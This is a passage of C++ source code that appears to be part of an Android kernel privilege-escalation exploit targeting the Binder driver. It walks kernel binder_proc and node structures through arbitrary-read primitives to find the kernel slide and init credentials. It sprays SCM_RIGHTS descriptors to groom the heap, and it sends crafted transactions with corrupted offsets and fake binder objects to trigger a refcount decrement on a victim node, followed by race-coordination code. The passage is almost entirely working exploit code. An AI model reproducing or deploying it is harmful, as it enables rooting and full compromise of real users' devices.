        if (!kernel_pointer(node) ||
            !reliable_read64(node + 56, &proc) ||
            !kernel_pointer(proc) ||
            !arbitrary_read32(proc + 64, &pid) || pid == 0 ||
            !reliable_read64(proc + 72, &task) ||
            !kernel_pointer(task)) {
            continue;
        }
        std::uint32_t usage = 0;
        std::uint32_t sid = 0;
        std::uint64_t caps = 0;
        std::uint64_t sched_slot = 0;
        if (derive_kernel_profile(task, &slide, &init_cred, &usage, &sid,
                                  &caps, &sched_slot)) {
            g_last_binder_probe_file = node;
            g_profile_kernel_slide = slide;
            g_profile_init_cred = init_cred;
            break;
        }
    }
    if (!kernel_address(init_cred)) {
        return 0;
    }
    if (kernel_pointer(g_last_main_binder_proc)) {
        g_last_binder_probe_stage = 7;
        return g_last_main_binder_proc;
    }

    // The disclosed Owner2 process stays bound for this scan. Binder inserts
    // newer processes at the global hlist head, so its next links contain
    // only older processes. This avoids racing short-lived clients at the
    // live global head.
    std::uint64_t cursor = 0;
    for (std::uint64_t node : candidates) {
        std::uint64_t proc = 0;
        std::uint32_t pid = 0;
        std::uint64_t task = 0;
        std::uint64_t refs = 0;
        if (kernel_pointer(node) &&
            reliable_read64(node + 56, &proc) && kernel_pointer(proc) &&
            arbitrary_read32(proc + 64, &pid) && pid != 0 &&
            reliable_read64(proc + 72, &task) && kernel_pointer(task) &&
            reliable_read64(proc + 32, &refs) &&
            (refs == 0 || kernel_pointer(refs))) {
            cursor = proc;
            g_last_binder_probe_anchor_proc = proc;
            break;
        }
    }
    if (!kernel_pointer(cursor)) {
        return 0;
    }
    g_last_binder_probe_stage = 5;
    std::set<std::uint64_t> visited;
    while (kernel_pointer(cursor) && visited.insert(cursor).second &&
           visited.size() <= 4096) {
        std::uint32_t pid = 0;
        std::uint64_t task = 0;
        std::uint64_t refs = 0;
        std::uint64_t next = 0;
        bool valid = arbitrary_read32(cursor + 64, &pid) &&
                reliable_read64(cursor + 72, &task) &&
                kernel_pointer(task) &&
                reliable_read64(cursor + 32, &refs) &&
                (refs == 0 || kernel_pointer(refs));
        if (valid && pid == static_cast<std::uint32_t>(getpid())) {
            g_last_main_binder_proc = cursor;
            g_last_binder_probe_marker_offset = 0;
            g_last_binder_probe_stage = 6;
            return cursor;
        }
        if (!reliable_read64(cursor, &next)) {
            break;
        }
        cursor = next;
    }
    return 0;
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_vandam_prism_NativeBridge_probeCurrentBinderProc(
        JNIEnv* environment, jclass) {
    std::uint64_t current_proc = find_current_binder_proc();
    bool pass = kernel_pointer(current_proc);
    if (pass) {
        g_cached_current_binder_proc = current_proc;
    }
    char state[320];
    std::snprintf(state, sizeof(state),
            "status=%s stage=current-binder-proc"
            " proc=0x%" PRIx64 " probe_stage=%d nodes=%d"
            " anchor_proc=0x%" PRIx64 " fops=0x%" PRIx64
            " kernel_base=0x%" PRIx64,
            pass ? "pass" : "miss", current_proc,
            g_last_binder_probe_stage, g_last_binder_probe_nodes,
            g_last_binder_probe_anchor_proc, g_last_binder_probe_fops,
            g_last_binder_probe_base);
    return environment->NewStringUTF(state);
}

std::uint64_t find_target_binder_proc(std::uint64_t proc, int handle) {
    g_last_target_binder_proc = 0;
    g_last_binder_ref_nodes = 0;
    std::uint64_t root = 0;
    if (!kernel_pointer(proc) || handle <= 0 ||
        !reliable_read64(proc + 32, &root) || !kernel_pointer(root)) {
        return 0;
    }
    std::vector<std::uint64_t> pending {root};
    std::set<std::uint64_t> visited;
    while (!pending.empty() && visited.size() < 4096) {
        std::uint64_t rb = pending.back();
        pending.pop_back();
        if (!kernel_pointer(rb) || !visited.insert(rb).second || rb < 16) {
            continue;
        }
        ++g_last_binder_ref_nodes;
        std::uint64_t ref = rb - 16;
        std::uint32_t desc = 0;
        if (reliable_read32(ref + 4, &desc) &&
            desc == static_cast<std::uint32_t>(handle)) {
            std::uint64_t node = 0;
            std::uint64_t target_proc = 0;
            if (reliable_read64(ref + 88, &node) && kernel_pointer(node) &&
                reliable_read64(node + 56, &target_proc) &&
                kernel_pointer(target_proc)) {
                g_last_target_binder_proc = target_proc;
                return target_proc;
            }
            return 0;
        }
        std::uint64_t right = 0;
        std::uint64_t left = 0;
        bool right_read = reliable_read64(rb + 8, &right);
        bool left_read = reliable_read64(rb + 16, &left);
        if (right_read && kernel_pointer(right)) {
            pending.push_back(right);
        }
        if (left_read && kernel_pointer(left)) {
            pending.push_back(left);
        }
    }
    return 0;
}

bool security_target_proc_is_live(std::uint64_t proc) {
    std::uint64_t previous_link = 0;
    std::uint64_t linked_proc = 0;
    std::uint64_t next = 0;
    if (!kernel_pointer(proc) ||
            !reliable_read64(proc, &next) ||
            (next != 0 && !kernel_pointer(next)) ||
            !reliable_read64(proc + 8, &previous_link) ||
            !kernel_pointer(previous_link) ||
            !reliable_read64(previous_link, &linked_proc) ||
            linked_proc != proc) {
        return false;
    }
    if (next == 0) {
        return true;
    }
    std::uint64_t next_previous_link = 0;
    return reliable_read64(next + 8, &next_previous_link) &&
            next_previous_link == proc;
}

std::uint64_t find_security_target_binder_proc() {
    if (!kernel_pointer(g_cached_current_binder_proc) ||
            g_security_target_pid <= 0) {
        return 0;
    }

    std::set<std::uint64_t> visited;
    std::vector<std::uint64_t> matches;
    auto inspect = [&](std::uint64_t candidate) {
        if (!kernel_pointer(candidate) ||
                !visited.insert(candidate).second) {
            return;
        }
        std::uint32_t pid = 0;
        std::uint64_t task = 0;
        if (reliable_read32(candidate + 64, &pid) &&
                pid == static_cast<std::uint32_t>(
                        g_security_target_pid) &&
                reliable_read64(candidate + 72, &task) &&
                kernel_pointer(task) &&
                security_target_proc_is_live(candidate)) {
            matches.push_back(candidate);
        }
    };

    std::uint64_t cursor = g_cached_current_binder_proc;
    while (kernel_pointer(cursor) && visited.size() < 4096) {
        inspect(cursor);
        std::uint64_t next = 0;
        if (!reliable_read64(cursor, &next) ||
                !kernel_pointer(next) ||
                visited.find(next) != visited.end()) {
            break;
        }
        cursor = next;
    }

    return matches.size() == 1 ? matches.front() : 0;
}

std::uint64_t find_raw_victim_node(int victim) {
    g_last_target_node_nodes = 0;
    g_last_target_pid = -1;
    g_last_binder_proc_nodes = 0;
    std::fill(std::begin(g_last_target_nodes),
              std::end(g_last_target_nodes), 0);
    std::fill(std::begin(g_last_target_pointers),
              std::end(g_last_target_pointers), 0);
    std::fill(std::begin(g_last_target_cookies),
              std::end(g_last_target_cookies), 0);
    if (!g_arb_read_ready || !g_raw_victims_configured || victim <= 0 ||
        victim >= kRawVictimCount) {
        return 0;
    }
    std::uint64_t proc = kernel_pointer(g_cached_current_binder_proc)
            ? g_cached_current_binder_proc : find_current_binder_proc();
    std::uint64_t target_proc = g_raw_target_proc;
    if (!kernel_pointer(target_proc)) {
        target_proc = find_target_binder_proc(
                proc, g_raw_target_handle);
        if (kernel_pointer(target_proc)) {
            g_raw_target_proc = target_proc;
        } else {
            target_proc = proc;
        }
    }
    std::uint32_t target_pid = static_cast<std::uint32_t>(g_raw_target_pid);
    if (!kernel_pointer(target_proc) || g_raw_target_pid <= 0) {
        return 0;
    }
    g_last_target_pid = static_cast<int>(target_pid);

    auto valid_proc = [&](std::uint64_t candidate) {
        std::uint32_t pid = 0;
        std::uint64_t task = 0;
        std::uint64_t nodes = 0;
        return kernel_pointer(candidate) &&
                arbitrary_read32(candidate + 64, &pid) && pid > 0 &&
                arbitrary_read64(candidate + 72, &task) &&
                kernel_pointer(task) &&
                arbitrary_read64(candidate + 24, &nodes) &&
                (nodes == 0 || kernel_pointer(nodes));
    };

    auto search_nodes = [&](std::uint64_t binder_proc) {
        std::uint64_t root = 0;
        if (!arbitrary_read64(binder_proc + 24, &root) ||
            !kernel_pointer(root)) {
            return UINT64_C(0);
        }
        std::vector<std::uint64_t> pending {root};
        std::set<std::uint64_t> visited;
        while (!pending.empty() && visited.size() < 4096) {
            std::uint64_t rb = pending.back();
            pending.pop_back();
            if (!kernel_pointer(rb) || !visited.insert(rb).second ||
                rb < 32) {
                continue;
            }
            std::uint64_t node = rb - 32;
            std::uint64_t pointer = 0;
            std::uint64_t cookie = 0;
            bool values_read = arbitrary_read64(node + 88, &pointer) &&
                    arbitrary_read64(node + 96, &cookie);
            int seen = g_last_target_node_nodes++;
            if (seen < 8) {
                g_last_target_nodes[seen] = node;
                g_last_target_pointers[seen] = pointer;
                g_last_target_cookies[seen] = cookie;
            }
            if (values_read &&
                pointer == g_raw_victim_pointers[victim] &&
                cookie == g_raw_victim_cookies[victim]) {
                return node;
            }
            std::uint64_t right = 0;
            std::uint64_t left = 0;
            if (arbitrary_read64(rb + 8, &right) &&
                kernel_pointer(right)) {
                pending.push_back(right);
            }
            if (arbitrary_read64(rb + 16, &left) &&
                kernel_pointer(left)) {
                pending.push_back(left);
            }
        }
        return UINT64_C(0);
    };

    std::uint32_t direct_pid = 0;
    if (arbitrary_read32(target_proc + 64, &direct_pid) &&
        direct_pid == target_pid) {
        ++g_last_binder_proc_nodes;
        std::uint64_t node = search_nodes(target_proc);
        if (kernel_pointer(node)) {
            g_last_target_binder_proc = target_proc;
            return node;
        }
    }

    std::set<std::uint64_t> visited_procs;
    auto inspect_proc = [&](std::uint64_t candidate) {
        if (!kernel_pointer(candidate) ||
            !visited_procs.insert(candidate).second) {
            return UINT64_C(0);
        }
        ++g_last_binder_proc_nodes;
        std::uint32_t pid = 0;
        if (arbitrary_read32(candidate + 64, &pid) && pid == target_pid) {
            return search_nodes(candidate);
        }
        return UINT64_C(0);
    };

    std::uint64_t cursor = target_proc;
    while (kernel_pointer(cursor) && visited_procs.size() < 4096 &&
           visited_procs.find(cursor) == visited_procs.end()) {
        std::uint64_t node = inspect_proc(cursor);
        if (kernel_pointer(node)) {
            g_last_target_binder_proc = cursor;
            g_raw_target_proc = cursor;
            return node;
        }
        std::uint64_t next = 0;
        if (!arbitrary_read64(cursor, &next)) {
            break;
        }
        cursor = next;
    }

    cursor = target_proc;
    while (visited_procs.size() < 4096) {
        std::uint64_t previous = 0;
        if (!arbitrary_read64(cursor + 8, &previous) ||
            !valid_proc(previous)) {
            break;
        }
        cursor = previous;
        if (visited_procs.find(cursor) != visited_procs.end()) {
            break;
        }
        std::uint64_t node = inspect_proc(cursor);
        if (kernel_pointer(node)) {
            g_last_target_binder_proc = cursor;
            g_raw_target_proc = cursor;
            return node;
        }
    }
    return 0;
}

int allocate_scm_pressure(std::vector<int>* sockets, int* saved_errno,
                          int held_source = -1,
                          int per_pair_limit = INT_MAX) {
    sockets->clear();
    *saved_errno = 0;
    int held = held_source >= 0
            ? fcntl(held_source, F_DUPFD_CLOEXEC, 0)
            : eventfd(0, EFD_CLOEXEC | EFD_NONBLOCK);
    if (held < 0) {
        *saved_errno = errno;
        return 0;
    }
    sockets->push_back(held);

    int passed[kScmFileCount];
    std::fill(std::begin(passed), std::end(passed), held);
    std::uint8_t control[CMSG_SPACE(sizeof(passed))] {};
    auto* header = reinterpret_cast<cmsghdr*>(control);
    header->cmsg_level = SOL_SOCKET;
    header->cmsg_type = SCM_RIGHTS;
    header->cmsg_len = CMSG_LEN(sizeof(passed));
    std::memcpy(CMSG_DATA(header), passed, sizeof(passed));
    std::uint8_t byte = 0x53;
    iovec vector {&byte, sizeof(byte)};
    msghdr message {};
    message.msg_iov = &vector;
    message.msg_iovlen = 1;
    message.msg_control = control;
    message.msg_controllen = sizeof(control);

    int allocated = 0;
    while (allocated < kScmPressureTarget) {
        int pair[2] {-1, -1};
        if (socketpair(AF_UNIX, SOCK_DGRAM | SOCK_CLOEXEC,
                       0, pair) != 0) {
            *saved_errno = errno;
            break;
        }
        int buffer_size = 1024 * 1024;
        setsockopt(pair[0], SOL_SOCKET, SO_SNDBUF,
                   &buffer_size, sizeof(buffer_size));
        setsockopt(pair[1], SOL_SOCKET, SO_RCVBUF,
                   &buffer_size, sizeof(buffer_size));
        int on_pair = 0;
        while (allocated < kScmPressureTarget &&
                on_pair < per_pair_limit) {
            errno = 0;
            if (sendmsg(pair[0], &message,
                        MSG_DONTWAIT | MSG_NOSIGNAL) < 0) {
                *saved_errno = errno;
                break;
            }
            ++allocated;
            ++on_pair;
        }
        if (on_pair == 0) {
            close(pair[0]);
            close(pair[1]);
            break;
        }
        sockets->push_back(pair[0]);
        sockets->push_back(pair[1]);
        bool pair_limit_reached = on_pair >= per_pair_limit;
        if (!pair_limit_reached && *saved_errno != EAGAIN &&
                *saved_errno != EWOULDBLOCK) {
            break;
        }
        *saved_errno = 0;
    }
    return allocated;
}

int drain_scm_receiver(int receiver) {
    int messages = 0;
    for (;;) {
            std::uint8_t byte = 0;
            iovec vector {&byte, sizeof(byte)};
            std::uint8_t control[CMSG_SPACE(
                    kScmFileCount * sizeof(int))] {};
            msghdr message {};
            message.msg_iov = &vector;
            message.msg_iovlen = 1;
            message.msg_control = control;
            message.msg_controllen = sizeof(control);
            if (recvmsg(receiver, &message,
                        MSG_DONTWAIT | MSG_CMSG_CLOEXEC) < 0) {
                break;
            }
            ++messages;
            for (cmsghdr* header = CMSG_FIRSTHDR(&message);
                 header != nullptr;
                 header = CMSG_NXTHDR(&message, header)) {
                if (header->cmsg_level != SOL_SOCKET ||
                    header->cmsg_type != SCM_RIGHTS ||
                    header->cmsg_len < CMSG_LEN(0)) {
                    continue;
                }
                std::size_t bytes = header->cmsg_len - CMSG_LEN(0);
                int* descriptors = reinterpret_cast<int*>(
                        CMSG_DATA(header));
                for (std::size_t fd_index = 0;
                     fd_index < bytes / sizeof(int); ++fd_index) {
                    close(descriptors[fd_index]);
                }
            }
    }
    return messages;
}

int release_scm_pressure(std::vector<int>* sockets, bool reverse = false) {
    if (reverse && sockets->size() >= 3) {
        for (std::size_t index = sockets->size() - 1;; index -= 2) {
            drain_scm_receiver((*sockets)[index]);
            if (index == 2) {
                break;
            }
        }
    } else {
        for (std::size_t index = 2; index < sockets->size(); index += 2) {
            drain_scm_receiver((*sockets)[index]);
        }
    }
    int closed = 0;
    for (auto iterator = sockets->rbegin();
         iterator != sockets->rend(); ++iterator) {
        if (*iterator >= 0) {
            close(*iterator);
            ++closed;
        }
    }
    sockets->clear();
    return closed;
}

struct BinderReply {
    int ioctl_result = -1;
    int ioctl_errno = 0;
    binder_uintptr_t buffer = 0;
    binder_uintptr_t offsets = 0;
    binder_size_t data_size = 0;
    binder_size_t offsets_size = 0;
    std::uint32_t terminal_response = 0;
};

BinderReply transact_and_read(int fd,
                              const binder_transaction_data& transaction) {
    BinderReply result;
    std::uint8_t command[
            sizeof(std::uint32_t) + sizeof(transaction)] {};
    write_command(command, BC_TRANSACTION, &transaction,
                  sizeof(transaction));
    std::size_t written = 0;
    for (int attempt = 0; attempt < 256; ++attempt) {
        std::uint8_t read_buffer[4096] {};
        binder_write_read request {};
        request.write_size = sizeof(command) - written;
        request.write_buffer = reinterpret_cast<binder_uintptr_t>(
                command + written);
        request.read_size = sizeof(read_buffer);
        request.read_buffer = reinterpret_cast<binder_uintptr_t>(read_buffer);
        errno = 0;
        result.ioctl_result = ioctl(fd, BINDER_WRITE_READ, &request);
        result.ioctl_errno = errno;
        if (result.ioctl_result != 0) {
            if (errno == EINTR) {
                continue;
            }
            return result;
        }
        if (request.write_consumed > sizeof(command) - written) {
            result.ioctl_result = -1;
            result.ioctl_errno = EIO;
            return result;
        }
        written += static_cast<std::size_t>(request.write_consumed);
        for (std::size_t offset = 0;
             offset + sizeof(std::uint32_t) <= request.read_consumed;) {
            std::uint32_t response = 0;
            std::memcpy(&response, read_buffer + offset, sizeof(response));
            offset += sizeof(response);
            std::size_t payload_size = _IOC_SIZE(response);
            if (offset + payload_size > request.read_consumed) {
                result.ioctl_result = -1;
                result.ioctl_errno = EPROTO;
                return result;
            }
            if (response == BR_REPLY &&
                payload_size >= sizeof(binder_transaction_data)) {
                binder_transaction_data reply {};
                std::memcpy(&reply, read_buffer + offset, sizeof(reply));
                result.buffer = reply.data.ptr.buffer;
                result.offsets = reply.data.ptr.offsets;
                result.data_size = reply.data_size;
                result.offsets_size = reply.offsets_size;
                result.terminal_response = response;
                return result;
            }
            if (response == BR_FAILED_REPLY || response == BR_DEAD_REPLY) {
                result.terminal_response = response;
                return result;
            }
            offset += payload_size;
        }
    }
    result.ioctl_result = -1;
    result.ioctl_errno = EAGAIN;
    return result;
}

#if defined(__aarch64__)
__attribute__((naked)) void get_platform_binder_sp(
        AIBinder*, std::uint64_t*) {
    __asm__ volatile(
            "mov x8, x1\n"
            "ldr x9, [x0]\n"
            "ldr x9, [x9, #16]\n"
            "br x9\n");
}
#endif

int platform_binder_handle(std::uint64_t object) {
    if (object == 0) {
        return -1;
    }
    std::uint64_t vtable = 0;
    std::memcpy(&vtable, reinterpret_cast<const void*>(object),
                sizeof(vtable));
    if (vtable == 0) {
        return -1;
    }
    std::ptrdiff_t top_adjust = 0;
    std::memcpy(&top_adjust,
                reinterpret_cast<const void*>(vtable - 2 * sizeof(void*)),
                sizeof(top_adjust));
    std::uint64_t top = object + top_adjust;
    std::int32_t handle = -1;
    std::memcpy(&handle, reinterpret_cast<const void*>(top + 0x10),
                sizeof(handle));
    std::int32_t kind = -1;
    std::memcpy(&kind, reinterpret_cast<const void*>(top + 0x20),
                sizeof(kind));
    g_top_adjust = top_adjust;
    g_handle_kind = kind;
    return kind == 0 && handle > 0 && handle <= 65535 ? handle : -1;
}

bool calibrate_ndk_wrapper(JNIEnv* environment, jobject binder,
                           int expected_handle) {
    AIBinder* wrapper = AIBinder_fromJavaBinder(environment, binder);
    if (wrapper == nullptr) {
        return false;
    }
    std::uint64_t platform = 0;
    get_platform_binder_sp(wrapper, &platform);
    g_proxy_native_data = reinterpret_cast<std::uint64_t>(wrapper);
    std::memcpy(g_proxy_words, wrapper, sizeof(g_proxy_words));
    bool offset_found = false;
    for (std::size_t offset = 0; offset <= 248; offset += 8) {
        std::uint64_t candidate = 0;
        std::memcpy(&candidate,
                    reinterpret_cast<const std::uint8_t*>(wrapper) + offset,
                    sizeof(candidate));
        if (candidate == platform) {
            g_wrapper_offset = offset;
            offset_found = true;
            break;
        }
    }
    int decoded = platform_binder_handle(platform);
    AIBinder_decStrong(wrapper);
    return offset_found && decoded == expected_handle;
}

int discover_proxy_handle(JNIEnv* environment, jobject binder) {
    if (binder == nullptr) {
        return -1;
    }
    AIBinder* wrapper = AIBinder_fromJavaBinder(environment, binder);
    if (wrapper == nullptr) {
        return -1;
    }
    std::uint64_t platform = 0;
    get_platform_binder_sp(wrapper, &platform);
    bool found = false;
    for (std::size_t offset = 0; offset <= 248; offset += 8) {
        std::uint64_t candidate = 0;
        std::memcpy(&candidate,
                    reinterpret_cast<const std::uint8_t*>(wrapper) + offset,
                    sizeof(candidate));
        if (candidate == platform) {
            found = true;
            break;
        }
    }
    int handle = found ? platform_binder_handle(platform) : -1;
    AIBinder_decStrong(wrapper);
    return handle;
}

int proxy_handle_from_layout(JNIEnv* environment, jobject binder,
                             std::size_t object_slot,
                             std::ptrdiff_t handle_offset) {
    (void)object_slot;
    (void)handle_offset;
    AIBinder* wrapper = AIBinder_fromJavaBinder(environment, binder);
    if (wrapper == nullptr) {
        return -1;
    }
    std::uint64_t object = 0;
    std::memcpy(&object,
                reinterpret_cast<const std::uint8_t*>(wrapper) +
                        g_wrapper_offset,
                sizeof(object));
    int handle = platform_binder_handle(object);
    AIBinder_decStrong(wrapper);
    return handle;
}

bool extract_cohort_handles(JNIEnv* environment, jobject calibration,
                            jobjectArray binders,
                            int* first_handle, int* last_handle,
                            std::size_t* slot_out,
                            std::ptrdiff_t* offset_out) {
    if (calibration == nullptr) {
        return false;
    }
    int binder_fd = duplicate_binder_fd();
    if (binder_fd < 0) {
        return false;
    }
    std::size_t selected_slot = 0;
    std::ptrdiff_t selected_offset = 0;
    int calibration_handle = locate_descriptor(
            binder_fd, kCalibrationDescriptor, 1024);
    g_calibration_handle = calibration_handle;
    bool layout_found = calibrate_ndk_wrapper(
            environment, calibration, calibration_handle);
    if (calibration_handle < 0 || !layout_found) {
        close(binder_fd);
        return false;
    }
    std::set<int> handles;
    for (int index = 0; index < kCohortSize; ++index) {
        jobject binder = environment->GetObjectArrayElement(binders, index);
        int handle = binder == nullptr ? -1 :
                proxy_handle_from_layout(environment, binder,
                        selected_slot, selected_offset);
        if (binder != nullptr) {
            environment->DeleteLocalRef(binder);
        }
        if (handle <= 0 || !handles.insert(handle).second) {
            return false;
        }
        g_cohort_handles[index] = handle;
    }
    bool first_verified = query_descriptor(
            binder_fd, g_cohort_handles[0]) ==
            "com.vandam.prism.Node.0";
    close(binder_fd);
    if (!first_verified) {
        return false;
    }
    *first_handle = g_cohort_handles[0];
    *last_handle = g_cohort_handles[kCohortSize - 1];
    *slot_out = selected_slot;
    *offset_out = selected_offset;
    g_handle_delta = selected_offset;
    return true;
}

struct CveResult {
    int ioctl_result = -1;
    int ioctl_errno = 0;
    bool failed_reply = false;
    bool transaction_complete = false;
    bool dead_reply = false;
};

CveResult send_single_decrement(int fd, int target,
                                binder_uintptr_t victim_pointer,
                                binder_uintptr_t victim_cookie,
                                std::atomic<int>* overlap_phase = nullptr,
                                std::atomic<int>* overlap_parked = nullptr,
                                std::atomic<int>* overlap_finish = nullptr) {
    constexpr std::size_t object_size = sizeof(flat_binder_object);
    static_assert(object_size == 24);
    constexpr binder_size_t data_size = 256;
    constexpr binder_size_t offsets_size = 2 * sizeof(binder_size_t);
    constexpr binder_size_t trigger = data_size + offsets_size;

    std::uint8_t data[trigger] {};
    binder_size_t offsets[2] {0, trigger};

    flat_binder_object target_object {};
    target_object.hdr.type = BINDER_TYPE_HANDLE;
    target_object.handle = static_cast<std::uint32_t>(target);
    std::memcpy(data, &target_object, sizeof(target_object));

    flat_binder_object fake_victim {};
    fake_victim.hdr.type = BINDER_TYPE_BINDER;
    fake_victim.binder = victim_pointer;
    fake_victim.cookie = victim_cookie;
    std::memcpy(data + object_size, &fake_victim, sizeof(fake_victim));

    binder_size_t corrupted_offset = object_size;
    std::memcpy(data + data_size, &corrupted_offset,
                sizeof(corrupted_offset));

    binder_transaction_data transaction {};
    transaction.target.handle = static_cast<std::uint32_t>(target);
    transaction.code = 1;
    transaction.data_size = data_size;
    transaction.offsets_size = offsets_size;
    transaction.data.ptr.buffer = reinterpret_cast<binder_uintptr_t>(data);
    transaction.data.ptr.offsets =
            reinterpret_cast<binder_uintptr_t>(offsets);

    std::uint8_t write_buffer[
            sizeof(std::uint32_t) + sizeof(transaction)] {};
    write_command(write_buffer, BC_TRANSACTION, &transaction,
                  sizeof(transaction));
    std::uint8_t read_buffer[4096] {};
    binder_write_read request {};
    request.write_size = sizeof(write_buffer);
    request.write_buffer = reinterpret_cast<binder_uintptr_t>(write_buffer);
    request.read_size = sizeof(read_buffer);
    request.read_buffer = reinterpret_cast<binder_uintptr_t>(read_buffer);

    CveResult result;
    errno = 0;
    result.ioctl_result = ioctl(fd, BINDER_WRITE_READ, &request);
    result.ioctl_errno = errno;
    if (overlap_phase != nullptr && overlap_parked != nullptr &&
        overlap_finish != nullptr) {
        overlap_parked->store(1, std::memory_order_release);
        overlap_phase->store(3, std::memory_order_release);
        while (overlap_finish->load(std::memory_order_acquire) == 0) {
            syscall(SYS_futex, overlap_finish, FUTEX_WAIT_PRIVATE, 0,
                    nullptr, nullptr, 0);
        }
    }
    for (std::size_t offset = 0;
         offset + sizeof(std::uint32_t) <= request.read_consumed;) {
        std::uint32_t response = 0;
        std::memcpy(&response, read_buffer + offset, sizeof(response));
        offset += sizeof(response);
        std::size_t payload_size = _IOC_SIZE(response);
        if (offset + payload_size > request.read_consumed) {
            break;
        }
        result.failed_reply |= response == BR_FAILED_REPLY;
        result.transaction_complete |= response == BR_TRANSACTION_COMPLETE;
        result.dead_reply |= response == BR_DEAD_REPLY;
        offset += payload_size;
    }
    return result;
}

constexpr int kSplitDecrementPhaseReady = 1;
constexpr int kSplitDecrementPhaseParked = 3;
constexpr int kSplitDecrementPhaseReadDone = 5;
constexpr int kSplitDecrementWaitMs = 5000;
constexpr std::size_t kSplitDecrementWriteSize =
        sizeof(std::uint32_t) + sizeof(binder_transaction_data);

struct SplitDecrementContext {
    pthread_t thread {};
    int fd = -1;
    int target = -1;
    binder_uintptr_t victim_pointer = 0;
    binder_uintptr_t victim_cookie = 0;
    std::uint64_t generation = 0;
    int staged_generation = 0;
    int expected = 0;
    int staged_expected = 0;
    int staged_active = 0;
    pid_t tid = -1;
    pid_t read_tid = -1;
    std::atomic<int> phase {0};
    std::atomic<int> go {0};
    std::atomic<int> release {0};
    std::atomic<bool> cancel {false};
    std::atomic<bool> write_attempted {false};
    std::atomic<bool> thread_exited {false};
    bool go_issued = false;
    int write_result = -1;
    int write_errno = 0;
    binder_size_t write_consumed = 0;
    binder_size_t write_read_consumed = 0;
    int read_result = -1;
    int read_errno = 0;
    binder_size_t read_consumed = 0;
    binder_size_t read_write_consumed = 0;
    int write_enter_cpu = -1;
    int write_return_cpu = -1;
    int read_enter_cpu = -1;
    int read_return_cpu = -1;
    int coordinator_cpu = -1;
    int poll_result = -1;
    int poll_errno = 0;
    short poll_revents = 0;
    bool exact_write = false;
    bool staged_wake = false;
    int read_responses = 0;
    int read_transaction_complete = 0;
    int read_failed_reply = 0;
    int read_dead_reply = 0;
    int read_unexpected = 0;
    bool read_malformed = false;
    bool exact_read = false;
    std::uint32_t read_first = 0;
    std::uint32_t read_second = 0;
    bool thread_created = false;
    bool thread_joined = false;
    bool join_timed_out = false;
    int join_result = 0;
    bool staged_stable = false;
    bool global_published = false;
    bool all_entered = false;
    int staged_state2 = 0;
    int all_state2 = 0;
    int blocked = 0;
    bool retirement_before_go = false;
    bool retirement_after_write = false;
    bool generation_valid = false;
};

std::mutex g_split_decrement_quarantine_mutex;
SplitDecrementContext* g_split_decrement_quarantine_context = nullptr;
std::atomic<bool> g_split_decrement_quarantine_gate {false};

void split_decrement_wake(std::atomic<int>* value);

bool quarantine_split_decrement_context(SplitDecrementContext* context) {
    if (context == nullptr) {
        return false;
    }
    std::lock_guard<std::mutex> lock(g_split_decrement_quarantine_mutex);
    if (g_split_decrement_quarantine_gate.load(
                std::memory_order_acquire)) {
        return false;
    }
    g_split_decrement_quarantine_context = context;
    g_split_decrement_quarantine_gate.store(true,
            std::memory_order_release);
    return true;
}

struct SplitDecrementExitMarker {
    SplitDecrementContext* context;
    ~SplitDecrementExitMarker() {
        context->thread_exited.store(true, std::memory_order_release);
        split_decrement_wake(&context->phase);
    }
};

void split_decrement_wake(std::atomic<int>* value) {
    syscall(SYS_futex, value, FUTEX_WAKE_PRIVATE, INT_MAX,
            nullptr, nullptr, 0);
}

bool wait_split_decrement_phase(const SplitDecrementContext& context,
                                int expected, int timeout_ms) {
    for (int elapsed = 0; elapsed < timeout_ms; ++elapsed) {
        int phase = context.phase.load(std::memory_order_acquire);
        if (phase == expected) {
            return true;
        }
        if (phase < 0) {
            return false;
        }
        usleep(1000);
    }
    return context.phase.load(std::memory_order_acquire) == expected;
}

bool split_decrement_generation_current_locked(
        const SplitDecrementContext& context, bool check_retirement) {
    if (!g_fake_control_active ||
        g_fake_control_generation != context.generation ||
        g_fake_control_expected != context.expected ||
        g_fake_control_expected != kFakeControlSprayCount ||
        g_fake_control_staged_limit != kFakeControlStagedCount ||
        g_fake_control_staged_expected != context.staged_expected ||
        context.staged_expected != kFakeControlStagedCount ||
        g_fake_control_staged_generation != context.staged_generation ||
        (check_retirement &&
         g_terminal_fd_retirement_gate.load(std::memory_order_acquire))) {
        return false;
    }
    int active_staged = 0;
    for (const auto& slot : g_fake_control_slots) {
        active_staged += fake_control_slot_active_staged(slot) ? 1 : 0;
    }
    return active_staged == context.staged_active &&
            active_staged == kFakeControlStagedCount;
}

bool capture_split_decrement_generation_locked(
        SplitDecrementContext* context) {
    context->generation = g_fake_control_generation;
    context->staged_generation = g_fake_control_staged_generation;
    context->expected = g_fake_control_expected;
    context->staged_expected = g_fake_control_staged_expected;
    context->staged_active = 0;
    for (const auto& slot : g_fake_control_slots) {
        context->staged_active += fake_control_slot_active_staged(slot) ?
                1 : 0;
    }
    return split_decrement_generation_current_locked(*context, false);
}

void parse_split_decrement_read(SplitDecrementContext* context,
                                const std::uint8_t* buffer,
                                binder_size_t consumed) {
    context->read_responses = 0;
    context->read_transaction_complete = 0;
    context->read_failed_reply = 0;
    context->read_dead_reply = 0;
    context->read_unexpected = 0;
    context->read_malformed = false;
    context->read_first = 0;
    context->read_second = 0;
    if (consumed > 4096 || consumed != 2 * sizeof(std::uint32_t)) {
        context->read_malformed = true;
        context->exact_read = false;
        return;
    }
    std::size_t offset = 0;
    for (int index = 0; index < 2; ++index) {
        if (offset + sizeof(std::uint32_t) > consumed) {
            context->read_malformed = true;
            break;
        }
        std::uint32_t response = 0;
        std::memcpy(&response, buffer + offset, sizeof(response));
        offset += sizeof(response);
        std::size_t payload_size = _IOC_SIZE(response);
        if (payload_size > consumed - offset) {
            context->read_malformed = true;
            break;
        }
        if (index == 0) {
            context->read_first = response;
        } else {
            context->read_second = response;
        }
        ++context->read_responses;
        if (response == BR_NOOP && payload_size == 0) {
            ++context->read_transaction_complete;
        } else if (response == BR_FAILED_REPLY && payload_size == 0) {
            ++context->read_failed_reply;
        } else if (response == BR_DEAD_REPLY) {
            ++context->read_dead_reply;
        } else {
            ++context->read_unexpected;
        }
        offset += payload_size;
    }
    context->exact_read = context->read_result == 0 &&
            context->read_errno == 0 && context->read_write_consumed == 0 &&
            context->read_consumed == 2 * sizeof(std::uint32_t) &&
            !context->read_malformed && context->read_responses == 2 &&
            context->read_first == BR_NOOP &&
            context->read_second == BR_FAILED_REPLY &&
            context->read_transaction_complete == 1 &&
            context->read_failed_reply == 1 &&
            context->read_dead_reply == 0 &&
            context->read_unexpected == 0;
}

